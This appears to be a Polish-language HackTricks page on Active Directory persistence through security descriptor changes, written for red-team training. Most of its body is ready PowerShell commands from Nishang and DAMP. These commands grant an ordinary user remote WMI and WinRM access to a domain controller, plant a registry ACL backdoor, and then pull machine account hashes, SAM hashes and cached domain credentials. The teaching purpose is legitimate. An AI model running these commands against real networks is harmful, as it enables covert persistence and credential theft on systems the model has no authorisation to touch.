# Security Descriptors

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** 💬 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}

## Security Descriptors

[Z dokumentacji](https://learn.microsoft.com/en-us/windows/win32/secauthz/security-descriptor-definition-language): Język definicji deskryptora zabezpieczeń (SDDL) definiuje format, który jest używany do opisu deskryptora zabezpieczeń. SDDL używa ciągów ACE dla DACL i SACL: `ace_type;ace_flags;rights;object_guid;inherit_object_guid;account_sid;`

**Deskryptory zabezpieczeń** są używane do **przechowywania** **uprawnień**, jakie **obiekt** ma **nad** innym **obiektem**. Jeśli możesz **wprowadzić** **niewielką zmianę** w **deskryptorze zabezpieczeń** obiektu, możesz uzyskać bardzo interesujące uprawnienia nad tym obiektem bez potrzeby bycia członkiem grupy z uprawnieniami.

Ta technika utrzymywania dostępu opiera się na zdolności do zdobycia każdego potrzebnego uprawnienia wobec określonych obiektów, aby móc wykonać zadanie, które zazwyczaj wymaga uprawnień administratora, ale bez potrzeby bycia administratorem.

### Access to WMI

Możesz dać użytkownikowi dostęp do **zdalnego wykonywania WMI** [**używając tego**](https://github.com/samratashok/nishang/blob/master/Backdoors/Set-RemoteWMI.ps1):
```bash
Set-RemoteWMI -UserName student1 -ComputerName dcorp-dc –namespace 'root\cimv2' -Verbose
Set-RemoteWMI -UserName student1 -ComputerName dcorp-dc–namespace 'root\cimv2' -Remove -Verbose #Remove
```
### Access to WinRM

Daj dostęp do **winrm PS console dla użytkownika** [**używając tego**](https://github.com/samratashok/nishang/blob/master/Backdoors/Set-RemoteWMI.ps1)**:**
```bash
Set-RemotePSRemoting -UserName student1 -ComputerName <remotehost> -Verbose
Set-RemotePSRemoting -UserName student1 -ComputerName <remotehost> -Remove #Remove
```
### Zdalny dostęp do hashy

Uzyskaj dostęp do **rejestru** i **zrzucaj hashe**, tworząc **tylną furtkę rejestru za pomocą** [**DAMP**](https://github.com/HarmJ0y/DAMP)**,** aby w każdej chwili móc odzyskać **hash komputera**, **SAM** oraz wszelkie **zbuforowane poświadczenia AD** na komputerze. Dlatego bardzo przydatne jest nadanie tej zgody **zwykłemu użytkownikowi w stosunku do komputera kontrolera domeny**:
```bash
# allows for the remote retrieval of a system's machine and local account hashes, as well as its domain cached credentials.
Add-RemoteRegBackdoor -ComputerName <remotehost> -Trustee student1 -Verbose

# Abuses the ACL backdoor set by Add-RemoteRegBackdoor to remotely retrieve the local machine account hash for the specified machine.
Get-RemoteMachineAccountHash -ComputerName <remotehost> -Verbose

# Abuses the ACL backdoor set by Add-RemoteRegBackdoor to remotely retrieve the local SAM account hashes for the specified machine.
Get-RemoteLocalAccountHash -ComputerName <remotehost> -Verbose

# Abuses the ACL backdoor set by Add-RemoteRegBackdoor to remotely retrieve the domain cached credentials for the specified machine.
Get-RemoteCachedCredential -ComputerName <remotehost> -Verbose
```
Sprawdź [**Silver Tickets**](silver-ticket.md), aby dowiedzieć się, jak możesz wykorzystać hash konta komputera kontrolera domeny.

{% hint style="success" %}
Ucz się i ćwicz Hacking AWS:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Ucz się i ćwicz Hacking GCP: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Wsparcie HackTricks</summary>

* Sprawdź [**plany subskrypcyjne**](https://github.com/sponsors/carlospolop)!
* **Dołącz do** 💬 [**grupy Discord**](https://discord.gg/hRep4RUj7f) lub [**grupy telegram**](https://t.me/peass) lub **śledź** nas na **Twitterze** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Dziel się trikami hackingowymi, przesyłając PR-y do** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) repozytoriów github.

</details>
{% endhint %}
